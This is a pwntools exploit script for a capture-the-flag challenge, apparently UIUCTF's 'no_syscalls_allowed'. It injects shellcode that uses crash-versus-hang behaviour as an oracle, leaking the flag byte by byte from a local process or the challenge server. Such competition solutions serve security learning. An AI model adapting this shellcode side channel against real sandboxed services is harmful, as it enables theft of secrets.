
# A custom template for binary exploitation that uses pwntools.
# Examples:
#   python exploit.py DEBUG NOASLR GDB
#   python exploit.py DEBUG REMOTE

import sys
import string
import random
from pwn import *

# Set up pwntools for the correct architecture. See `context.binary/arch/bits/endianness` for more
context.binary = elfexe = ELF('./no_syscalls_allowed')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, disable ASLR and run through GDB
# for all created processes: 
# $ ./exploit.py DEBUG NOASLR GDB
# You can also run the remote or local target with the option REMOTE
# Feasibility of remote debugging is possible only via ssh (not netcat) and depends from the remote system
def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([elfexe.path] + argv, gdbscript, elfexe.path, *a, *kw)
    else:
        target = process([elfexe.path] + argv, *a, **kw)
    return target

# Specify your gdb script here for debugging. gdb will be launched the GDB argument is given.
gdbscript = '''
# init-gef
# target record-full # Not supported with AVX instructions yet

# continue
b *main

# call   rdx <shellcode>
b *main+166

continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

arguments = []
if args['REMOTE']:
    remote_server = 'no-syscalls-allowed.chal.uiuc.tf'
    remote_port = 1337

# Include some of the string.punctuation, but not all
alphabet = string.ascii_letters + string.digits + "!#$&()*+,-./:;<=>?@[]^_`{|}"
def craft_shellcode(flagidx, alphabetidx, flagoffset):
    """Checks if flag[flagidx] == alphabet[alphabetidx]
    Args:
        flagidx: Index of flag character to brute-force
        alphabetidx: Index of alphabet character to test
        flagoffset: Offset of the flag in the RW- segment

    Returns:
        The shellcode
    """
    shellcode = asm(f'''
    // int1 /* hardware breakpoint since self-modifying code */

    MOV RAX, -0x1000 /* 0xfffffffffffff000 */
    AND R13, RAX
    ADD R13, 0x3000  /* R13 = base address of RW- segment */
    ADD R13, {flagoffset}    /* R13 = &flag */

    MOV DL, byte ptr [R13 + {flagidx}] /* DL = flag[flagidx] */

    LEA RBX, [RIP+alphabet]
    MOV AL, byte ptr [RBX + {alphabetidx}] /* AL = alphabet[alphabetidx] */

    CMP AL, DL
    JZ hang
    segfault:
    xor    RAX, RAX
    mov    RAX, qword ptr [RAX]
    hang:
    JMP hang

    /************* Data section *************/

    // We do add a NULL byte in the end because we do not care
    alphabet:
    .ascii "{alphabet}"
    ''')
    assert(len(shellcode) <= 0x1000)
    padded_shellcode = shellcode + b'\x90'*(0x1000 - len(shellcode)) # pad with NOPs
    assert(len(padded_shellcode) == 0x1000)
    return padded_shellcode
    

def leak_byte(flagidx, flagoffset):
    for i in range(len(alphabet)):
        shellcode = craft_shellcode(flagidx, i, flagoffset)
        io = remote(remote_server, remote_port) if args['REMOTE'] else start(arguments)
        io.send(shellcode)
        # io.interactive() # for debugging
        try:
            # Obviously we will not receive anything. We just want to see if the remote will
            # close the connection (SIGSEGV) or not
            io.recvn(4096, timeout=1)  # in seconds.
            io.close()
            return alphabet[i]
        except EOFError:
            io.close()
    return None # not in alphabet

########## Offset brute-forcing code ##########
# for offset in range(0x00, 0x200, 8):
#     log.info(f"Attempting offset {hex(offset)}")
#     leaked_prefix = ''
#     prefix = 'uiuc' # uiuctf{
#     while True: 
#         leak = leak_byte(len(leaked_prefix), offset)
#         if leak is None:
#             break   # try next offset
#         leaked_prefix += leak
#         if leaked_prefix != prefix[:len(leaked_prefix)]:
#             break   # try next offset
#         if leaked_prefix == prefix:
#             log.success(f'Found flag in offset: {hex(offset)}')
#             sys.exit(0)

###########################################

if args['REMOTE']:
    flagoffset = 0x80
else:
    flagoffset = 0x40

flag = ''
while not flag.endswith('}'):
    flag += leak_byte(len(flag), flagoffset)
    log.success(flag)
log.success(f'Found flag: {flag}') # uiuctf{timing-is-everything}
